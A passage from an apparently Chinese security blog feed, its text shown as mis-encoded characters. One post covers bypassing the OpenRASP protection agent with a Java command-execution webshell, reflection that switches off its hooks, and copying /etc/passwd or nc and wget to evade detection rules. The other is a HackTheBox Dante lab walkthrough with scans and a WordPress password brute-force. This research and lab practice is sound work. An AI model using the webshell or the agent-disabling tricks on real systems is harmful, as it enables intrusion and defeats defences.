class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doGet</span><span class="params">(HttpServletRequest request, HttpServletResponse response)</span> <span class="keyword">throws</span> IOException &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="type">Class</span> <span class="variable">cls</span> <span class="operator">=</span> Class.forName(<span class="string">&quot;com.baidu.openrasp.HookHandler&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">enableHookFiled</span> <span class="operator">=</span> cls.getDeclaredField(<span class="string">&quot;enableHook&quot;</span>);</span><br><span class="line">        <span class="type">Field</span> <span class="variable">modifiers</span> <span class="operator">=</span> enableHookFiled.getClass().getDeclaredField(<span class="string">&quot;modifiers&quot;</span>);</span><br><span class="line">        modifiers.setAccessible(<span class="literal">true</span>);</span><br><span class="line">        modifiers.setInt(enableHookFiled, enableHookFiled.getModifiers() &amp; ~Modifier.FINAL);</span><br><span class="line">        enableHookFiled.set(cls.newInstance(), <span class="keyword">new</span> <span class="title class_">AtomicBoolean</span>(<span class="literal">false</span>));</span><br><span class="line">    &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="type">Process</span> <span class="variable">process</span> <span class="operator">=</span> Runtime.getRuntime().exec(request.getParameter(<span class="string">&quot;cmd&quot;</span>));</span><br><span class="line">    <span class="type">InputStream</span> <span class="variable">inputStream</span> <span class="operator">=</span> process.getInputStream();</span><br><span class="line"></span><br><span class="line">    <span class="type">ByteArrayOutputStream</span> <span class="variable">byteArrayOutputStream</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ByteArrayOutputStream</span>();</span><br><span class="line">    <span class="type">byte</span>[] bytes = <span class="keyword">new</span> <span class="title class_">byte</span>[<span class="number">2048</span>];</span><br><span class="line">    <span class="type">int</span> <span class="variable">a</span> <span class="operator">=</span> -<span class="number">1</span>;</span><br><span class="line">    <span class="keyword">while</span> ((a=inputStream.read(bytes)) != -<span class="number">1</span>)&#123;</span><br><span class="line">        byteArrayOutputStream.write(bytes,<span class="number">0</span>,a);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">PrintWriter</span> <span class="variable">out</span> <span class="operator">=</span> response.getWriter();</span><br><span class="line">    out.println(<span class="keyword">new</span> <span class="title class_">String</span>(byteArrayOutputStream.toByteArray()));</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ä¹‹åæˆåŠŸbypassï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" title="image-20230807002758651" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7d91ddac507cc87afa4.jpg" alt="image-20230807002758651"></a></p><p>é‚£æ—¢ç„¶è¿™ä¸ªæ–¹æ³•å¯è¡Œï¼Œé‚£æˆ‘ä»¬ä¸å¦¨æ‰¾æ‰¾åœ¨åˆšåˆšçš„hookæµç¨‹ä¸­ï¼Œæˆ‘ä»¬è¿˜èƒ½é€šè¿‡åå°„æ›´æ”¹å“ªäº›å­—æ®µï¼Œä»è€Œä¸­æ­¢hookæµç¨‹ï¼Ÿè¿˜è®°å¾—æˆ‘ä»¬ä¹‹å‰æåˆ°çš„é‚£ä¸ªç†”æ–­å¼€å…³å—ï¼Ÿé‚£ä¸ªæ˜¯RASPä¸ºäº†åœ¨CPUå æ¯”è¿‡é«˜çš„æƒ…å†µä¸‹è®¾ç½®çš„ã€‚æˆ‘ä»¬ä¹Ÿå¯ä»¥é€šè¿‡è°ƒç”¨ä»¥ä¸‹æ–¹å¼æ‰‹åŠ¨è®¾ç½®ç†”æ–­ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">Config</span> <span class="variable">config</span> <span class="operator">=</span> Config.getConfig();</span><br><span class="line">config.setDisableHooks(<span class="string">&quot;true&quot;</span>);</span><br></pre></td></tr></table></figure><p>ä¹‹åä¸­æ­¢hookï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" title="image-20230807003115746" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7e71ddac507cc87cd93.jpg" alt="image-20230807003115746"></a></p><p>ä¸ä¹‹ç±»ä¼¼çš„è¿˜æœ‰configç±»çš„cloudSwitchå­—æ®µä»¥åŠhookWhiteAllå­—æ®µï¼Œè¿™ä¸¤ä¸ªå°±äº¤ç»™è¯»è€…äº†ã€‚</p><h3 id="cpå‘½ä»¤ç»•è¿‡RASP"><a href="#cpå‘½ä»¤ç»•è¿‡RASP" class="headerlink" title="cpå‘½ä»¤ç»•è¿‡RASP"></a>cpå‘½ä»¤ç»•è¿‡RASP</h3><p>ä»¥è¯»å–&#x2F;etc&#x2F;passwdä¸ºä¾‹ï¼Œæˆ‘ä»¬çœ‹ä¸€ä¸‹OpenRASPçš„åŒ¹é…è§„åˆ™ï¼š</p><p><a href="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" title="image-20230807003535721" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd7f51ddac507cc87ea48.jpg" alt="image-20230807003535721"></a></p><p>è¿™é‡Œåªæ˜¯åŒ¹é…äº†cat.{1,5}&#x2F;etc&#x2F;passwdï¼Œé‚£åŠ å…¥æˆ‘ä»¬ä½¿ç”¨cpå‘½ä»¤å°†&#x2F;etc&#x2F;passwdå¤åˆ¶åˆ°&#x2F;tmp&#x2F;passwdï¼Œç„¶åå†æŸ¥çœ‹&#x2F;tmp&#x2F;passwdä¸å°±å¯ä»¥ç»•è¿‡äº†å—ï¼Ÿ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?cmd=cp /etc/passwd /tmp/passwd</span><br><span class="line">?cmd=cat /tmp/passwd</span><br></pre></td></tr></table></figure><p><a href="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" title="image-20230807003646953" class="gallery-item"><img src="https://pic.imgdb.cn/item/64cfd8041ddac507cc880948.jpg" alt="image-20230807003646953"></a></p><p>åŒç†ï¼Œæˆ‘ä»¬å¯ä»¥å°†æŸäº›ç¦æ­¢ä½¿ç”¨çš„å‘½ä»¤ï¼Œå¦‚&#x2F;bin&#x2F;ncã€&#x2F;bin&#x2F;wgetç­‰copyåˆ°åˆ«çš„ä½ç½®ï¼Œä¹‹åå†è¿›è¡Œè°ƒç”¨æ¥è¿›è¡Œbypassã€‚</p><h2 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h2><p>æœ¬ç¯‡æ–‡ç« ä¸»è¦é’ˆå¯¹OpenRASPè¿›è¡Œäº†å¯åŠ¨æµç¨‹çš„åˆ†æå’ŒHookæµç¨‹çš„åˆ†æï¼Œæ”¶è·å¾ˆå¤§ï¼Œç®—æ˜¯RASPå…¥é—¨ï¼Ÿæ—¶è‡³ä»Šæ—¥ï¼Œä¸ªäººæ„Ÿè§‰RASPæŠ€æœ¯åœ¨å¤§è§„æ¨¡åº”ç”¨ä¸Šä»ç„¶æœ‰æ¯”è¾ƒå¤§çš„å›°éš¾ã€‚ä¸€æ–¹é¢å°±æ˜¯ä»¤äººè¯Ÿç—…çš„æ€§èƒ½åŸå› ï¼Œè¿˜æœ‰ä¸€æ–¹é¢è¦æ±‚å®‰å…¨äººå‘˜å¯¹æ¼æ´çš„åŸç†å¿…é¡»æ·±å…¥åˆ°ä»£ç å±‚é¢ã€‚å› æ­¤æ„Ÿè§‰RASPæŠ€æœ¯å¯èƒ½å°±åƒGlassyå¸ˆå‚…åœ¨KConå¤§ä¼šè¯´å¾—é‚£æ ·ï¼Œä¸èƒ½åƒä»å‰ä¸€æ ·åªæ˜¯å°†æ¶æ„è¡Œä¸ºè¦†ç›–æ‰ï¼Œå› ä¸ºæ¶æ„è¡Œä¸ºæ˜¯ä¸å¯ç©·ä¸¾çš„ï¼Œæœ€å¥½çš„è§£å†³åŠæ³•å°±æ˜¯åœ¨æ¼æ´çš„å…¥å£ç‚¹å°†æ”»å‡»è¿›è¡Œæœ‰æ•ˆæ‹¦æˆªã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      
        <tags>
            
            <tag> security </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HTB Dante Walkthrough</title>
      <link href="/2023/05/15/htb-dante/"/>
      <url>/2023/05/15/htb-dante/</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"><h2 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h2><p>æœ€è¿‘å¿ç—›ä¹°äº†HTBçš„pro labsï¼Œ è´­ä¹°ä¹‹åå¯ä»¥æ‰“ä»»ä½•labï¼Œè¿˜æ˜¯æŒºåˆ’ç®—çš„ã€‚è¿™ç¯‡æ–‡ç« å¯¹Danteå®éªŒå®¤ä½œä¸ªç®€å•çš„è®°å½•ï¼Œä¸ä¼šæä¾›ä»»ä½•ä¸€å°æœºå­çš„flagï¼Œåªæ˜¯ç»™æ‰“é¶åˆå¡ä½äº†çš„å¸ˆå‚…ä»¬æä¾›ä¸€ä¸ªè§£é¢˜çš„æ€è·¯ã€‚å»ºè®®è¿˜æ˜¯è‡ªå·±äº²è‡ªå»æ‰“æ‰èƒ½å­¦åˆ°æ›´å¤šä¸œè¥¿ã€‚getshellã€ææƒä»¥åŠæ¨ªå‘çš„å…¶ä»–æ–¹å¼ï¼Œå¸ˆå‚…ä»¬å¯ä»¥è‡ªè¡Œç ”ç©¶ã€‚</p><p>æ³¨ï¼š å†™è¿™ç¯‡æ–‡ç« çš„æ—¶å€™ï¼Œå› ä¸ºç½‘ç»œåŸå› ï¼Œé‡æ¢äº†å‡ æ¬¡htbçš„vpn serverï¼Œæ‰€ä»¥å¯èƒ½å­˜åœ¨å‰åIPä¸åŒçš„æƒ…å†µã€‚</p><h2 id="æ‰“é¶"><a href="#æ‰“é¶" class="headerlink" title="æ‰“é¶"></a>æ‰“é¶</h2><h3 id="å­˜æ´»ä¸»æœºæ¢æµ‹"><a href="#å­˜æ´»ä¸»æœºæ¢æµ‹" class="headerlink" title="å­˜æ´»ä¸»æœºæ¢æµ‹"></a>å­˜æ´»ä¸»æœºæ¢æµ‹</h3><p>danteç»™çš„ç½‘æ®µæ˜¯10.10.110.0&#x2F;24ï¼Œç›´æ¥fscanæ‰«ï¼Œæ‰«æç»“æœï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# fscan -h 10.10.110.0/24                        </span><br><span class="line"></span><br><span class="line">   ___                              _    </span><br><span class="line">  / _ \     ___  ___ _ __ __ _  ___| | __ </span><br><span class="line"> / /_\/____/ __|/ __| &#x27;__/ _` |/ __| |/ /</span><br><span class="line">/ /_\\_____\__ \ (__| | | (_| | (__|   &lt;    </span><br><span class="line">\____/     |___/\___|_|  \__,_|\___|_|\_\   </span><br><span class="line">                     fscan version: 1.8.2</span><br><span class="line">start infoscan</span><br><span class="line">(icmp) Target 10.10.110.2     is alive</span><br><span class="line">(icmp) Target 10.10.110.100   is alive</span><br><span class="line">[*] Icmp alive hosts len is: 2</span><br><span class="line">10.10.110.100:21 open</span><br><span class="line">10.10.110.100:22 open</span><br><span class="line">[*] alive ports len is: 2</span><br><span class="line">start vulscan</span><br><span class="line">[+] ftp://10.10.110.100:21:anonymous </span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root 123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root root@111 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root 123456789 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root abc123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root Aa123456 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 1/2 [-] ssh 10.10.110.100:22 root Charge123 ssh: handshake failed: ssh: unable to authenticate, attempted methods [none password], no supported methods remain</span><br><span class="line">å·²å®Œæˆ 2/2</span><br><span class="line">[*] æ‰«æç»“æŸ,è€—æ—¶: 7m8.392454575s</span><br></pre></td></tr></table></figure><h3 id="Iâ€™m-nuts-and-bolts-about-you"><a href="#Iâ€™m-nuts-and-bolts-about-you" class="headerlink" title="Iâ€™m nuts and bolts about you"></a>Iâ€™m nuts and bolts about you</h3><p>å¯ä»¥çœ‹åˆ°10.10.110.100è¿™å°æœºå­å¯ä»¥åŒ¿åè®¿é—®ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461c8ba0d2dde5777ae9d48.jpg"></a></p><p>ä¸‹è½½ä¹‹åï¼Œæœ‰ä¸€ä¸ªtodo.txtï¼Œè¿™æ˜¯å®ƒçš„å†…å®¹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">- Finalize WordPress permission changes - PENDING</span><br><span class="line">- Update links to to utilize DNS Name prior to changing to port 80 - PENDING</span><br><span class="line">- Remove LFI vuln from the other site - PENDING</span><br><span class="line">- Reset James&#x27; password to something more secure - PENDING</span><br><span class="line">- Harden the system prior to the Junior Pen Tester assessment - IN PROGRESS</span><br></pre></td></tr></table></figure><p>æœ‰ä»¥ä¸‹å‡ ç‚¹æç¤ºéœ€è¦æ³¨æ„ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ä¸€ä¸ªéƒ¨ç½²ç€wordpressçš„ç«™ç‚¹ï¼Œç”¨æˆ·çš„æƒé™éœ€è¦æ›´æ”¹</span><br><span class="line">åˆ«çš„ç«™ç‚¹å­˜åœ¨LFIæ¼æ´</span><br><span class="line">jamesçš„å¯†ç å¯èƒ½å®¹æ˜“è¢«çˆ†ç ´å‡ºæ¥</span><br></pre></td></tr></table></figure><p>ä¹‹åæˆ‘ä»¬ç”¨nmapæ‰«ä¸€ä¸‹10.10.110.100ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line">â”Œâ”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# nmap -sS -sV -sC -A -p- --min-rate 5000 10.10.110.100  </span><br><span class="line">Starting Nmap 7.93 ( https://nmap.org ) at 2023-05-12 04:08 EDT</span><br><span class="line">Nmap scan report for 10.10.110.100</span><br><span class="line">Host is up (0.31s latency).</span><br><span class="line">Not shown: 65532 filtered tcp ports (no-response)</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">21/tcp    open  ftp     vsftpd 3.0.3</span><br><span class="line">| ftp-syst: </span><br><span class="line">|   STAT: </span><br><span class="line">| FTP server status:</span><br><span class="line">|      Connected to ::ffff:10.10.14.6</span><br><span class="line">|      Logged in as ftp</span><br><span class="line">|      TYPE: ASCII</span><br><span class="line">|      No session bandwidth limit</span><br><span class="line">|      Session timeout in seconds is 300</span><br><span class="line">|      Control connection is plain text</span><br><span class="line">|      Data connections will be plain text</span><br><span class="line">|      At session startup, client count was 2</span><br><span class="line">|      vsFTPd 3.0.3 - secure, fast, stable</span><br><span class="line">|_End of status</span><br><span class="line">| ftp-anon: Anonymous FTP login allowed (FTP code 230)</span><br><span class="line">|_Can&#x27;t get directory listing: PASV IP 172.16.1.100 is not the same as 10.10.110.100</span><br><span class="line">22/tcp    open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 8fa2ffcf4e3eaa2bc26ff45a2ad9e9da (RSA)</span><br><span class="line">|   256 07838eb6f7e672e965db42fdedd693ee (ECDSA)</span><br><span class="line">|_  256 1345c5cadba6b4ae9c097d21cd9d74f4 (ED25519)</span><br><span class="line">65000/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))</span><br><span class="line">| http-robots.txt: 2 disallowed entries </span><br><span class="line">|_/wordpress DANTE&#123;fake_flag&#125;</span><br><span class="line">|_http-server-header: Apache/2.4.41 (Ubuntu)</span><br><span class="line">|_http-title: Apache2 Ubuntu Default Page: It works</span><br><span class="line">Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running (JUST GUESSING): Linux 4.X|5.X (85%)</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5</span><br><span class="line">Aggressive OS guesses: Linux 4.15 - 5.6 (85%), Linux 5.0 (85%)</span><br><span class="line">No exact OS matches for host (test conditions non-ideal).</span><br><span class="line">Network Distance: 2 hops</span><br><span class="line">Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE (using port 21/tcp)</span><br><span class="line">HOP RTT       ADDRESS</span><br><span class="line">1   ...</span><br><span class="line">2   422.66 ms 10.10.110.100</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 72.58 seconds</span><br></pre></td></tr></table></figure><p>å‘ç°è¿˜æœ‰ä¸€ä¸ª65000çš„ç«¯å£è¢«å¼€æ”¾ï¼Œå¹¶ä¸”è¿˜å­˜åœ¨ä¸€ä¸ª&#x2F;wordpressç›®å½•ï¼Œè¿˜æœ‰ä¸€ä¸ªrobots.txtï¼Œè¿›å…¥æ‹¿åˆ°flagï¼š</p><p><a href="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6462afda0d2dde57771169b2.jpg"></a></p><h3 id="Itâ€™s-easier-this-way"><a href="#Itâ€™s-easier-this-way" class="headerlink" title="Itâ€™s easier this way"></a>Itâ€™s easier this way</h3><p>æ—¢ç„¶å­˜åœ¨ä¸€ä¸ªéƒ¨ç½²äº†wordpressï¼Œé‚£å°±ç”¨wpscanæ‰«ä¸€ä¸‹å§ï¼š</p><p><a href="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg" class="gallery-item"><img src="https://pic.imgdb.cn/item/6461cefc0d2dde5777b62b0c.jpg"></a></p><p>è§‚å¯Ÿæ‰«æç»“æœï¼Œå¯ä»¥çœ‹åˆ°æ‰«å‡ºæ¥äº†ä¸¤ä¸ªç”¨æˆ·åï¼Œadminå’Œjamesã€‚å›æƒ³åˆšåˆšçš„æç¤ºï¼Œæˆ‘ä»¬å¯ä»¥å°è¯•å»çˆ†ç ´ä¸€ä¸‹jamesçš„å¯†ç ã€‚ä½†æ˜¯å¯†ç å¤ªå¤šäº†ï¼Œä¸ºäº†èŠ‚çº¦æ—¶é—´å…ˆç”¨cewlæ¥ç»™æˆ‘ä»¬ç”Ÿæˆä¸ªå­—å…¸ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â”€â”€(rootã‰¿kali)-[/home/rainb0w/Desktop]</span><br><span class="line">â””â”€# cewl http://10.10.110.100:65000/wordpress -w password.txt</span><br><span class="line">CeWL 5.5.2 (Grouping) Robin Wood (robin@digi.ninja) (https://digi.ninja/)</span><br></pre></td></tr></table></figure><p>ä¹‹åç”¨wpscanæ¥çˆ†ç ´å¯†ç ï¼Œç»“æœä¸ºï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><span class="line">wpscan --url http://10.10.110.100:65000/wordpress --usernames james -P password.txt </span><br><span class="line">_______________________________________________________________</span><br><span class="line">         __          _______   _____</span><br><span class="line">         \ \        / /  __ \ / ____|</span><br><span class="line">          \ \  /\  / /| |__) | (___   ___  __ _ _ __ Â®</span><br><span class="line">           \ \/  \/ / |  ___/ \___ \ / __|/ _` | &#x27;_ \</span><br><span class="line">            \  /\  /  | |     ____) | (__| (_| | | | |</span><br><span class="line">             \/  \/   |_|    |_____/ \___|\__,_|_| |_|</span><br><span class="line"></span><br><span class="line">         WordPress Security Scanner by the WPScan Team</span><br><span class="line">                         Version 3.8.22</span><br><span class="line">       Sponsored by Automattic - https://automattic.com/</span><br><span class="line">       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart</span><br><span class="line">_______________________________________________________________</span><br><span class="line"></span><br><span class="line">[+] URL: http://10.10.110.100:65000/wordpress/ [10.10.110.100]</span><br><span class="line">[+] Started: Mon May 15 02:14:19 2023</span><br><span class="line"></span><br><span class="line">Interesting Finding(s):</span><br><span class="line"></span><br><span class="line">[+] Headers</span><br><span class="line"> | Interesting Entry: Server: Apache/2.4.41 (Ubuntu)</span><br><span class="line"> | Found By: Headers (Passive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] robots.txt found: http://10.10.110.100:65000/wordpress/robots.txt</span><br><span class="line"> | Found By: Robots Txt (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] XML-RPC seems to be enabled: http://10.10.110.100:65000/wordpress/xmlrpc.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | References:</span><br><span class="line"> |  - http://codex.wordpress.org/XML-RPC_Pingback_API</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/</span><br><span class="line"> |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/</span><br><span class="line"></span><br><span class="line">[+] WordPress readme found: http://10.10.110.100:65000/wordpress/readme.html</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] Debug Log found: http://10.10.110.100:65000/wordpress/wp-content/debug.log</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"> | Reference: https://codex.wordpress.org/Debugging_in_WordPress</span><br><span class="line"></span><br><span class="line">[+] Upload directory has listing enabled: http://10.10.110.100:65000/wordpress/wp-content/uploads/</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 100%</span><br><span class="line"></span><br><span class="line">[+] The external WP-Cron seems to be enabled: http://10.10.110.100:65000/wordpress/wp-cron.php</span><br><span class="line"> | Found By: Direct Access (Aggressive Detection)</span><br><span class="line"> | Confidence: 60%</span><br><span class="line"> | References:</span><br><span class="line"> |  - https://www.iplocation.net/defend-wordpress-from-ddos</span><br><span class="line"> |  - https://github.com/wpscanteam/wpscan/issues/1299</span><br><span class="line"></span><br><span class="line">[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).</span><br><span class="line"> | Found By: Rss Generator (Passive Detection)</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"> |  - http://10.10.110.100:65000/wordpress/index.php/comments/feed/, &lt;generator&gt;https://wordpress.org/?v=5.4.1&lt;/generator&gt;</span><br><span class="line"></span><br><span class="line">[+] WordPress theme in use: twentytwenty</span><br><span class="line"> | Location: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/</span><br><span class="line"> | Last Updated: 2023-03-29T00:00:00.000Z</span><br><span class="line"> | Readme: http://10.10.110.100:65000/wordpress/wp-content/themes/twentytwenty/readme.txt</span><br><span class="line"> | [!] The version is out of date, the latest version is 2.2</span><br><span class="line"> | Style URL: 